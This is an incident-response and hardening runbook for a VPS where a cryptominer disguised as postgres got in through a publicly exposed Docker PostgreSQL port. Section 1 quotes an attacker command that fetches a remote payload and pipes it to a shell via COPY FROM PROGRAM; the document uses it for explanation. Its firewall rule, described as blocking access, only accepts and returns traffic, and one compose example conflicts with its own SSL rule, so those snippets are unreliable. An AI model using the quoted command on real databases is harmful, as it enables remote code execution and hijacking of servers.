# VPS Security Hardening & Docker Isolation Runbook

This document details the root cause of the "fake postgres" cryptocurrency mining incident, step-by-step triage commands to clean an infected VPS, and defense-in-depth hardening procedures for Docker and host environments.

---

## 1. Incident Analysis: Anatomy of the "Fake Postgres" Exploit

### The Root Cause
1. **Docker iptables Bypass on Linux**:
   On Linux distributions (Ubuntu, Debian, CentOS), Docker automatically configures network routing by injecting iptables rules directly into the `PREROUTING` and `DOCKER` chains.
   These chains execute **before** the standard `INPUT` filter chain where UFW (Uncomplicated Firewall) rules reside.
   When a Docker container publishes a port using `"5432:5432"`, Docker binds the socket to `0.0.0.0:5432`. Consequently, incoming packets on port 5432 bypass UFW completely and reach the container from any public IP on the internet.

2. **Default Credential Scanning**:
   Automated threat actors (such as Kinsing, PgMiner, LemonDuck, and automated XMRig droppers) continuously scan IPv4 address space for open port 5432.
   When `docker-compose.yml` uses default credentials (`POSTGRES_USER: postgres`, `POSTGRES_PASSWORD: postgres`), automated scripts authenticate within seconds of port exposure.

3. **Remote Shell Code Execution via PostgreSQL**:
   After gaining superuser access to PostgreSQL, attackers execute arbitrary OS commands using:
   - `COPY ... FROM PROGRAM 'curl -s http://malicious-ip/payload | sh'`
   - Exploiting untrusted procedural languages or loading malicious `.so` dynamic libraries into `/tmp`.

4. **Process Masquerading and CPU Hijacking**:
   The malware payload executes a Monero (XMR) miner and spoof-names the binary process as `postgres`, `[postgres]`, `kdevtmpfsi`, `sysupdate`, or `networkservice`.
   When an administrator checks `top` or `ps`, the process appears as if PostgreSQL is actively querying data, but all CPU cores are pinned at 100% capacity.
   The botnet installer also drops persistence mechanisms via cron jobs, systemd services, and `/etc/ld.so.preload`.

---

## 2. Emergency Incident Response: Detection & Eradication

If a VPS exhibits high CPU usage or suspect `postgres` processes, run the following triage steps.

### Step 1: Detect Rogue Processes
Execute on the host:
```bash
# List top CPU consumers with process PID, owner, command name, and exact binary
ps -eo pid,user,comm,args,%cpu --sort=-%cpu | head -n 20
```

Inspect the executable binary path of any suspicious process:
```bash
# Replace <PID> with the suspicious process ID
ls -l /proc/<PID>/exe
```
- A legitimate PostgreSQL process points to `/usr/lib/postgresql/.../bin/postgres` or `/usr/local/bin/postgres`.
- A disguised crypto-miner typically points to a deleted file in `/tmp/`, `/var/tmp/`, `/dev/shm/`, or a hidden directory like `~/.cache/`.

### Step 2: Terminate the Rogue Process
```bash
kill -9 <PID>
```

### Step 3: Check and Remove Malicious Persistence
Check crontabs for all users and the system:
```bash
# Check postgres user crontab
crontab -l -u postgres

# Check root and current user crontabs
crontab -l

# Check system cron directories
ls -la /etc/cron.* /var/spool/cron/crontabs/
```
If unfamiliar entries with `curl`, `wget`, or IP addresses appear, delete them immediately.

Check for rootkit preloading:
```bash
# Check if ld.so.preload exists and contains malicious library paths
cat /etc/ld.so.preload 2>/dev/null
```
If present and referencing non-system libraries, remove the file or clear its contents.

Inspect temporary writable directories for dropped binaries:
```bash
ls -la /tmp /var/tmp /dev/shm
```
Delete any unrecognized binary files or shell scripts found in these directories.

### Step 4: Recreate Clean Docker Containers
If PostgreSQL was compromised, the internal container files and databases may have backdoor functions. Recreate the container with clean data:
```bash
docker compose down -v
docker compose up -d
```

---

## 3. Docker Hardening & Network Isolation

### Rule 1: Bind Strictly to Localhost
In `docker-compose.yml`, never use `"5432:5432"`. Always specify the loopback interface:
```yaml
ports:
  - "127.0.0.1:5432:5432"
```
When bound to `127.0.0.1`, the Linux kernel rejects any connection originating outside the host machine. Even with Docker iptables forwarding, external internet packets cannot reach the service.

### Rule 2: In Production, Eliminate Host Port Publishing
In production multi-container setups where both backend API and database run on the same VPS, do not expose port 5432 to the host at all:
```yaml
services:
  postgres:
    image: postgres:17-alpine
    # No ports section needed; accessible internally by service name 'postgres'
    networks:
      - internal-net

  api:
    image: nutrition-api:latest
    networks:
      - internal-net
    environment:
      DATABASE_URL: postgresql://app_user:${STRONG_PASSWORD}@postgres:5432/nutrition?sslmode=disable

networks:
  internal-net:
    driver: bridge
```

### Rule 3: Enforce Non-Default Strong Passwords
Set passwords in an uncommitted `.env` file with at least 32 random characters:
```bash
# Generate high-entropy password
openssl rand -base64 32
```
In `docker-compose.yml`:
```yaml
environment:
  POSTGRES_USER: ${POSTGRES_USER:-app_user}
  POSTGRES_PASSWORD: ${POSTGRES_PASSWORD:?Error: POSTGRES_PASSWORD must be configured in .env}
```

### Rule 4: Container Security Flags and Resource Limits
Always configure container confinement in `docker-compose.yml`:
```yaml
security_opt:
  - no-new-privileges:true
deploy:
  resources:
    limits:
      cpus: "2.0"
      memory: 2048M
```
`no-new-privileges:true` prevents privilege escalation attacks inside the container. Resource limits ensure that even in the worst-case breach, a runaway process cannot freeze the VPS operating system.

---

## 4. VPS Host Defense & Firewall Hardening

### Preventing Docker from Overriding UFW
If services must expose ports through Docker on a Linux VPS, ensure UFW rules are respected by applying the `DOCKER-USER` iptables chain.

Add the following to `/etc/ufw/after.rules` before the `COMMIT` line:
```
# Block external access to Docker published ports unless explicitly allowed
*filter
:DOCKER-USER - [0:0]
-A DOCKER-USER -i eth0 -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
-A DOCKER-USER -i eth0 -j RETURN
COMMIT
```
Alternatively, use the battle-tested open-source helper `ufw-docker`:
```bash
wget -O /usr/local/bin/ufw-docker https://github.com/chaifeng/ufw-docker/raw/master/ufw-docker
chmod +x /usr/local/bin/ufw-docker
ufw-docker install
ufw reload
```

### Secure Database Administration via SSH Tunnel
Never open port 5432 to the internet to connect GUI database tools (e.g. DBeaver, TablePlus, pgAdmin). Instead, tunnel through SSH:
```bash
ssh -L 5432:127.0.0.1:5432 user@vps-ip -N
```
Then connect your local database client to `localhost:5432`.

### SSH Host Hardening
1. Disable password-based logins and root login in `/etc/ssh/sshd_config`:
   ```
   PermitRootLogin no
   PasswordAuthentication no
   PubkeyAuthentication yes
   ```
2. Restart SSH daemon:
   ```bash
   sudo systemctl restart sshd
   ```
3. Install and enable fail2ban:
   ```bash
   sudo apt update && sudo apt install -y fail2ban
   sudo systemctl enable --now fail2ban
   ```

---

## 5. Application-Level Security Defenses

### Backend API Configuration Guard
`apps/api/internal/config/config.go` implements a strict production validation check (`Validate()`).
When `ENVIRONMENT=production`, the server halts immediately during startup if:
- `DATABASE_URL` is empty.
- `DATABASE_URL` contains default credentials (`postgres:postgres`).
- `DATABASE_URL` contains `sslmode=disable`.
- Authentication secrets (`SUPABASE_JWT_SECRET` or `SUPABASE_JWKS_URL`) are omitted.

### Frontend HTTP Security Headers
`apps/web/next.config.ts` enforces modern HTTP defense-in-depth headers across all routes:
- `Content-Security-Policy`: Restricts scripts, frames, styles, and remote network calls.
- `X-Frame-Options: DENY`: Prevents UI redressing and clickjacking.
- `X-Content-Type-Options: nosniff`: Enforces strict MIME typing.
- `Referrer-Policy: strict-origin-when-cross-origin`: Blocks referrer leakage.
- `Permissions-Policy`: Restricts access to device sensors, camera, and microphone.
- `Strict-Transport-Security`: Forces HTTPS for two years across all subdomains.
